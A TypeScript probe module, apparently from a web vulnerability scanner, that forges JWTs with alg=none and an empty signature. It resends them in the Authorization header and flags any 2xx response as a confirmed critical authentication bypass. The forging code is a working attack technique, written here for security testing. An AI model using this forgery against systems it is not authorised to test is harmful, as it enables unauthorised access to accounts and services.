import type { Probe, ProbeVariant } from "../types";
import { registerProbe } from "../registry";

function b64urlDecode(s: string): string {
  const pad = s.length % 4 === 0 ? "" : "=".repeat(4 - (s.length % 4));
  const b64 = (s + pad).replace(/-/g, "+").replace(/_/g, "/");
  return atob(b64);
}

function b64urlEncode(s: string): string {
  return btoa(s).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

function forgeAlgNone(token: string): string | null {
  const parts = token.split(".");
  if (parts.length !== 3) return null;
  const header = JSON.parse(b64urlDecode(parts[0]!)) as Record<string, unknown>;
  const payload = b64urlDecode(parts[1]!);
  header.alg = "none";
  const newHeader = b64urlEncode(JSON.stringify(header));
  return `${newHeader}.${parts[1]}.`;
}

const variant: ProbeVariant = {
  id: "authn.alg-none",
  label: "AuthN · JWT alg=none",
  group: "authn",
  severity: "critical",
  mutate(ctx) {
    const auth = ctx.headers["authorization"] ?? "";
    const m = /^Bearer\s+(.+)$/i.exec(auth);
    if (!m) return ctx;
    const forged = forgeAlgNone(m[1]!);
    if (!forged) return ctx;
    return { ...ctx, headers: { ...ctx.headers, authorization: `Bearer ${forged}` } };
  },
  detect(req, baseline) {
    if (req.status === "ERR" || typeof req.status !== "number") return null;
    if (req.status < 200 || req.status >= 300) return null;
    const baseOk = baseline && typeof baseline.status === "number"
      && baseline.status >= 200 && baseline.status < 300;
    if (!baseOk) return null;

    return {
      variantId: variant.id,
      probeId: "authn.alg-none",
      probeLabel: "JWT alg=none",
      group: "authn",
      verdict: "CONFIRMED",
      severity: "critical",
      confidence: 0.98,
      evidence: `Server accepted a JWT with alg=none and returned ${req.status}`,
      diff: {
        statusBefore: baseline!.status as number,
        statusAfter: req.status,
        lengthBefore: baseline!.bodySize,
        lengthAfter: req.bodySize,
      },
      requestUrl: req.url,
      requestMethod: req.method,
      responseSnippet: req.bodyText.slice(0, 400),
    };
  },
};

export const algNoneProbe: Probe = {
  id: "authn.alg-none",
  label: "JWT alg=none",
  group: "authn",
  description:
    "Decodes the current JWT, re-signs it with alg=none (no signature), and resends. " +
    "Any 2xx response confirms the classic JWT algorithm-confusion vulnerability.",
  appliesTo(ctx) {
    const auth = ctx.headers["authorization"] ?? "";
    return /^Bearer\s+[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$/.test(auth);
  },
  variants: [variant],
};

registerProbe(algNoneProbe);
